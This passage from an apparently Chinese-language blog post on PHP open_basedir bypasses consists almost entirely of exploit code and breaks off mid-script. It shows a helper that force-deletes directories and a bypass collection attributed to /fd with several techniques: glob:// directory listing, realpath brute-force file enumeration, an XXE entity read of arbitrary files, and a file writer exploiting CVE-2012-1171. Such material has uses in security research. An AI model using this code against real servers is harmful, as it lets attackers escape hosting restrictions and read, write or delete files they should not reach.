&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> implode(<span class="string">'/'</span>, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delfile</span><span class="params">($deldir)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (@is_file($deldir)) &#123;</span><br><span class="line">        @chmod($deldir,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @unlink($deldir);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(@is_dir($deldir))&#123;</span><br><span class="line">        <span class="keyword">if</span>(($mydir = @opendir($deldir)) == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">false</span> !== ($file = @readdir($mydir)))</span><br><span class="line">        &#123;</span><br><span class="line">            $name = File_Str($deldir.<span class="string">'/'</span>.$file);</span><br><span class="line">            <span class="keyword">if</span>(($file!=<span class="string">'.'</span>) &amp;&amp; ($file!=<span class="string">'..'</span>))&#123;delfile($name);&#125;</span><br><span class="line">        &#125; </span><br><span class="line">        @closedir($mydir);</span><br><span class="line">        @chmod($deldir,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @rmdir($deldir) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">File_Str</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'//'</span>,<span class="string">'/'</span>,str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,$string));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span><span class="params">($length = <span class="number">6</span>)</span> </span>&#123;</span><br><span class="line">    $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $randStr = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randStr .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/php-script-p.png" alt="php-script-p"></p>
<h5 id="来自niexinming师傅的脚本"><a href="#来自niexinming师傅的脚本" class="headerlink" title="来自niexinming师傅的脚本"></a>来自niexinming师傅的脚本</h5><ul>
<li>代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PHP open_basedir bypass collection</span></span><br><span class="line"><span class="comment">Works with &gt;= PHP5</span></span><br><span class="line"><span class="comment">By /fd, <span class="doctag">@filedescriptor</span>(https://twitter.com/filedescriptor)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Assistant functions</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span><span class="params">($from, $to)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">	$from = rtrim($from, <span class="string">'\/'</span>) . <span class="string">'/'</span>;</span><br><span class="line">	$from = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $from);</span><br><span class="line">	$to = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $to);</span><br><span class="line"> </span><br><span class="line">	$from = explode(<span class="string">'/'</span>, $from);</span><br><span class="line">	$to = explode(<span class="string">'/'</span>, $to);</span><br><span class="line">	$relPath = $to;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">foreach</span> ($from <span class="keyword">as</span> $depth =&gt; $dir) &#123;</span><br><span class="line">		<span class="comment">// find first non-matching dir</span></span><br><span class="line">		<span class="keyword">if</span> ($dir === $to[$depth]) &#123;</span><br><span class="line">			<span class="comment">// ignore this directory</span></span><br><span class="line">			array_shift($relPath);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">			$remaining = count($from) - $depth;</span><br><span class="line">			<span class="keyword">if</span> ($remaining &gt; <span class="number">1</span>) &#123;</span><br><span class="line">				<span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">				$padLength = (count($relPath) + $remaining - <span class="number">1</span>) * <span class="number">-1</span>;</span><br><span class="line">				$relPath = array_pad($relPath, $padLength, <span class="string">'..'</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$relPath[<span class="number">0</span>] = <span class="string">'./'</span> . $relPath[<span class="number">0</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> implode(<span class="string">'/'</span>, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fallback</span><span class="params">($classes)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">		$object = <span class="keyword">new</span> $class;</span><br><span class="line">		<span class="keyword">if</span> ($object-&gt;isAvailable()) &#123;</span><br><span class="line">			<span class="keyword">return</span> $object;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> NoExploit;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Core classes</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoExploit</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'No exploit is available.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">DirectoryLister</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $currentPath;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setCurrentPath</span><span class="params">($currentPath)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;currentPath = $currentPath;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getCurrentPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;currentPath;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GlobWrapperDirectoryLister</span> <span class="keyword">extends</span> <span class="title">DirectoryLister</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> stripos(PHP_OS, <span class="string">'win'</span>) === <span class="keyword">FALSE</span> &amp;&amp; in_array(<span class="string">'glob'</span>, stream_get_wrappers());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Directory listing via glob pattern'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$file_list = <span class="keyword">array</span>();</span><br><span class="line">		<span class="comment">// normal files</span></span><br><span class="line">		$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://&#123;$this-&gt;getCurrentPath()&#125;*"</span>);</span><br><span class="line">		<span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">			$file_list[] = $f-&gt;__toString();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">		$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://&#123;$this-&gt;getCurrentPath()&#125;.*"</span>);</span><br><span class="line">		<span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">			$file_list[] = $f-&gt;__toString();</span><br><span class="line">		&#125;</span><br><span class="line">		sort($file_list);</span><br><span class="line">		<span class="keyword">return</span> $file_list;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealpathBruteForceDirectoryLister</span> <span class="keyword">extends</span> <span class="title">DirectoryLister</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $characters = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789-_'</span></span><br><span class="line">	, $extension = <span class="keyword">array</span>()</span><br><span class="line">	, $charactersLength = <span class="number">38</span></span><br><span class="line">	, $maxlength = <span class="number">3</span></span><br><span class="line">	, $fileList = <span class="keyword">array</span>();</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> ini_get(<span class="string">'open_basedir'</span>) &amp;&amp; function_exists(<span class="string">'realpath'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Directory listing via brute force searching with realpath function.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setCharacters</span><span class="params">($characters)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;characters = $characters;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;charactersLength = count($characters);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setExtension</span><span class="params">($extension)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;extension = $extension;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setMaxlength</span><span class="params">($maxlength)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;maxlength = $maxlength;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		set_time_limit(<span class="number">0</span>);</span><br><span class="line">		set_error_handler(<span class="keyword">array</span>(<span class="keyword">__CLASS__</span>, <span class="string">'handler'</span>));</span><br><span class="line">		$number_set = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">while</span> (count($number_set = <span class="keyword">$this</span>-&gt;nextCombination($number_set, <span class="number">0</span>)) &lt;= <span class="keyword">$this</span>-&gt;maxlength) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;searchFile($number_set);</span><br><span class="line">		&#125;</span><br><span class="line">		sort(<span class="keyword">$this</span>-&gt;fileList);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fileList;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">nextCombination</span><span class="params">($number_set, $length)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">isset</span>($number_set[$length])) &#123;</span><br><span class="line">			$number_set[$length] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">return</span> $number_set;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($number_set[$length] + <span class="number">1</span> === <span class="keyword">$this</span>-&gt;charactersLength) &#123;</span><br><span class="line">			$number_set[$length] = <span class="number">0</span>;</span><br><span class="line">			$number_set = <span class="keyword">$this</span>-&gt;nextCombination($number_set, $length + <span class="number">1</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$number_set[$length]++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $number_set;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">searchFile</span><span class="params">($number_set)</span> </span>&#123;</span><br><span class="line">		$file_name = <span class="string">'a'</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($number_set <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">			$file_name[$key] = <span class="keyword">$this</span>-&gt;characters[$value];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// normal files</span></span><br><span class="line">		realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . $file_name);</span><br><span class="line">		<span class="comment">// files with preceeding dot</span></span><br><span class="line">		realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . <span class="string">'.'</span> . $file_name);</span><br><span class="line">		<span class="comment">// files with extension</span></span><br><span class="line">		<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;extension <span class="keyword">as</span> $extension) &#123;</span><br><span class="line">			realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . $file_name . $extension);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">		$regexp = <span class="string">'/File\((.*)\) is not within/'</span>;</span><br><span class="line">		preg_match($regexp, $errstr, $matches);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($matches[<span class="number">1</span>])) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;fileList[] = $matches[<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FileWriter</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $filePath;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setFilePath</span><span class="params">($filePath)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;filePath = $filePath;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFilePath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filePath;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FileReader</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $filePath;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setFilePath</span><span class="params">($filePath)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;filePath = $filePath;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFilePath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filePath;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Assistant class for DOMFileWriter &amp; DOMFileReader</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StreamExploiter</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $mode, $filePath, $fileContent;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">stream_close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$doc = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">		$doc-&gt;strictErrorChecking = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;mode) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">			$doc-&gt;loadHTML(<span class="keyword">$this</span>-&gt;fileContent);</span><br><span class="line">			$doc-&gt;removeChild($doc-&gt;firstChild);</span><br><span class="line">			$doc-&gt;saveHTMLFile(<span class="keyword">$this</span>-&gt;filePath);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'r'</span>:</span><br><span class="line">			$doc-&gt;resolveExternals = <span class="keyword">true</span>;</span><br><span class="line">			$doc-&gt;substituteEntities = <span class="keyword">true</span>;</span><br><span class="line">			$doc-&gt;loadXML(<span class="string">"&lt;!DOCTYPE doc [&lt;!ENTITY file SYSTEM \"file://&#123;$this-&gt;filePath&#125;\"&gt;]&gt;&lt;doc&gt;&amp;file;&lt;/doc&gt;"</span>, LIBXML_PARSEHUGE);</span><br><span class="line">			<span class="keyword">echo</span> $doc-&gt;documentElement-&gt;firstChild-&gt;nodeValue;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">stream_open</span><span class="params">($path, $mode, $options, &amp;$opened_path)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;filePath = substr($path, <span class="number">10</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;mode = $mode;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;fileContent = $data;</span><br><span class="line">		<span class="keyword">return</span> strlen($data);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DOMFileWriter</span> <span class="keyword">extends</span> <span class="title">FileWriter</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> extension_loaded(<span class="string">'dom'</span>) &amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.10'</span>, <span class="string">'&lt;='</span>) || version_compare(phpversion(), <span class="string">'5.4.0'</span>, <span class="string">'='</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// set it to global resource in order to trigger RSHUTDOWN</span></span><br><span class="line">		<span 